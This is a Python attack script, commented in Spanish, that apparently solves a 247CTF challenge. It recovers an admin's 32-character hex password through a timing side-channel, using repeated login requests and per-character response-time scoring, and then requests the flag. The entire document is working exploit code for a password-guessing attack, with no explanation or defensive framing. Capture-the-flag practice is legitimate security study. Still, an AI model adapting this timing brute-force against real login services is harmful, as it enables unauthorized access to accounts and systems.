#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password}, timeout=10)
    return resp.json()

# Estrategia: 128 requests, 4 mediciones por carácter = 32 requests/posición = 4 posiciones
# Pero haré múltiples rondas para descubrir toda la contraseña
char_scores = [{} for _ in range(32)]

for round_num in range(8):
    api_token = get_token()
    request_count = 0
    
    # En cada ronda, medir 4 posiciones con 4 mediciones cada una
    start_pos = round_num * 4
    
    for pos_offset in range(4):
        pos = start_pos + pos_offset
        if pos >= 32:
            break
            
        for measurement in range(2):
            for char in HEX_CHARS:
                if request_count >= 120:
                    break
                
                # Construir password de prueba basándose en lo que sabemos hasta ahora
                test_pw = ""
                for p in range(32):
                    if p < pos:
                        # Usar el mejor carácter conocido hasta ahora
                        if char_scores[p]:
                            test_pw += max(char_scores[p].items(), key=lambda x: x[1])[0]
                        else:
                            test_pw += "0"
                    elif p == pos:
                        test_pw += char
                    else:
                        test_pw += "0"
                
                result, elapsed = try_login(test_pw, api_token)
                request_count += 1
                
                if result.get("result") == "success":
                    flag_result = get_flag(test_pw)
                    if "flag" in str(flag_result).lower():
                        print(flag_result.get("flag", flag_result))
                        exit(0)
                
                # Acumular score
                if char not in char_scores[pos]:
                    char_scores[pos][char] = 0
                char_scores[pos][char] += elapsed

# Construir contraseña final
final_password = ""
for pos in range(32):
    if char_scores[pos]:
        best_char = max(char_scores[pos].items(), key=lambda x: x[1])[0]
        final_password += best_char
    else:
        final_password += "0"

flag_result = get_flag(final_password)
if "flag" in str(flag_result).lower():
    print(flag_result.get("flag", flag_result))
